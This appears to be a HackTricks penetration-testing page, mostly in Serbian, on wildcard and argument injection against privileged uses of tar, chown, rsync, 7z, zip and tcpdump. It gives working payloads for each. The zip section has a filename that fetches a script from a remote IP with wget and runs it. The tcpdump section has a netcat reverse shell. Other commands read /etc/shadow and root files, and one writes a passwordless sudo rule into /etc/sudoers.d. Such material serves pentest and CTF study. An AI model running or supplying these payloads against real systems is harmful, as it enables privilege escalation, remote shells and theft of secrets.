# Wildcards — korisni trikovi

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** se dešava kada skripta sa povišenim privilegijama pokrene Unix binarni program kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … koristeći nenavođeni (unquoted) wildcard kao `*`.
> Pošto shell proširuje wildcard **pre** izvršavanja binarnog fajla, napadač koji može da kreira fajlove u radnom direktorijumu može da napravi imena fajlova koja počinju sa `-` tako da budu tumačena kao **opcije umesto podataka**, efektivno švercujući proizvoljne flagove ili čak komande.
> Ova stranica sakuplja najkorisnije primitivе, najnovija istraživanja i moderne detekcije za 2023–2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` je ubačen, što uzrokuje da *svi* odgovarajući fajlovi naslede vlasništvo i dozvole od `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinovani napad).
Za detalje pogledajte i klasični DefenseCode rad.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Izvršite proizvoljne naredbe zloupotrebom **checkpoint** funkcije:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` će se izvršiti kao root.

### bsdtar / macOS 14+

Podrazumevani `tar` na novijim macOS verzijama (zasnovan na `libarchive`) *ne* implementira `--checkpoint`, ali i dalje možete ostvariti code-execution pomoću opcije **--use-compress-program**, koja vam omogućava da navedete eksterni kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kada privilegovana skripta pokrene `tar -cf backup.tar *`, pokrenuće se `/bin/sh`.

---

## rsync

`rsync` vam omogućava da prepišete udaljeni shell ili čak udaljeni binarni fajl pomoću opcija komandne linije koje počinju sa `-e` ili `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum sa `rsync -az * backup:/srv/`, ubačeni flag pokreće vaš shell na udaljenom hostu.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovani skript *defenzivno* prefiksira wildcard sa `--` (da zaustavi option parsing), 7-Zip format podržava **file list files** prefixiranjem imena fajla sa `@`. Kombinovanjem toga sa symlink-om možete *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvršava nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu fajlova i prekida se, **ispisujući sadržaj na stderr**.

---

## zip

Postoje dve veoma praktične primitive kada aplikacija prosleđuje korisnički kontrolisane nazive fajlova `zip`-u (bilo putem wildcard-a ili izlistavanjem imena bez `--`).

- RCE via test hook: `-T` enables “test archive” and `-TT <cmd>` replaces the tester with an arbitrary program (long form: `--unzip-command <cmd>`). If you can inject filenames that start with `-`, split the flags across distinct filenames so short-options parsing works:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Napomene
- Do NOT try a single filename like `'-T -TT <cmd>'` — short options are parsed per character and it will fail. Use separate tokens as shown.
- Ako aplikacija uklanja kose crte iz imena fajlova, preuzmite sa direktnog hosta/IP (podrazumevana putanja `/index.html`) i sačuvajte lokalno sa `-O`, pa zatim izvršite.
- Možete debug-ovati parsiranje sa `-sc` (prikaži obrađeni argv) ili `-h2` (više pomoći) da razumete kako se vaši tokeni koriste.

Primer (lokalno ponašanje na zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Eksfiltracija podataka/leak: Ako web sloj ispisuje `zip` stdout/stderr (uobičajeno kod naivnih wrappers), injektovani flagovi poput `--help` ili greške usled loših opcija pojaviće se u HTTP odgovoru, potvrđujući command-line injection i pomažući u podešavanju payload-a.

---

## Dodatni binarni programi ranjivi na wildcard injection (brza lista 2023-2025)

Sledeće komande su zloupotrebljavane u modernim CTF-ovima i realnim okruženjima. Payload se uvek kreira kao *filename* unutar direktorijuma koji je upisiv i koji će kasnije biti obrađen sa wildcard-om:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Ove primitive su ređe od klasika *tar/rsync/zip* ali vredi ih proveriti tokom lova.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Kada restricted shell ili vendor wrapper gradi `tcpdump` komandnu liniju konkatenirajući polja koja kontroliše korisnik (npr. parametar "file name") bez stroge citacije/validacije, možete uneti dodatne `tcpdump` flagove. Kombinacija `-G` (time-based rotation), `-W` (limit number of files) i `-z <cmd>` (post-rotate command) dovodi do proizvoljnog izvršavanja komandi kao korisnik koji pokreće tcpdump (često root na appliance-ima).

Preduvjeti:

- Možete uticati na `argv` prosleđen `tcpdump`-u (npr. preko wrapper-a kao `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper ne sanitizuje razmake ili `-`-prefixed tokene u polju za ime fajla.

Classic PoC (izvršava reverse shell skript iz upisivog puta):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalji:

- `-G 1 -W 1` prisiljava neposrednu rotaciju nakon prvog pogođenog paketa.
- `-z <cmd>` pokreće post-rotate komandu jednom po rotaciji. Mnogi buildovi izvršavaju `<cmd> <savefile>`. Ako je `<cmd>` skripta/interpreter, osigurajte da rukovanje argumentima odgovara vašem payloadu.

No-removable-media variants:

- Ako imate neki drugi primitiv za pisanje fajlova (e.g., a separate command wrapper that allows output redirection), postavite svoju skriptu u poznatu putanju i pokrenite `-z /bin/sh /path/script.sh` ili `-z /path/script.sh` u zavisnosti od semantike platforme.
- Neki vendor wrappers rotiraju u lokacije koje napadač može kontrolisati. Ako možete uticati na rotiranu putanju (symlink/directory traversal), možete usmeriti `-z` da izvrši sadržaj koji potpuno kontrolišete bez eksternog medija.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- The `*` glob and permissive patterns only constrain the first `-w` argument. `tcpdump` accepts multiple `-w` options; the last one wins.
- The rule doesn’t pin other options, so `-Z`, `-r`, `-V`, etc. are allowed.

Primitivi
- Prepiši ciljnu putanju drugim `-w` (prvi samo zadovoljava sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal unutar prvog `-w` kako bi se izašlo iz ograničenog stabla:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Naterajte izlaz da bude u vlasništvu pomoću `-Z root` (kreira fajlove u vlasništvu root bilo gde):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Pisanje proizvoljnog sadržaja reprodukcijom pažljivo izrađenog PCAP-a preko `-r` (npr. da ubaci liniju u sudoers):

<details>
<summary>Kreirajte PCAP koji sadrži tačan ASCII payload i zapišite ga kao root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Proizvoljno čitanje fajla/secret leak pomoću `-V <file>` (tumači listu savefiles). Dijagnostika grešaka često ispisuje linije, što dovodi do otkrivanja sadržaja (leak):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Izvori

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
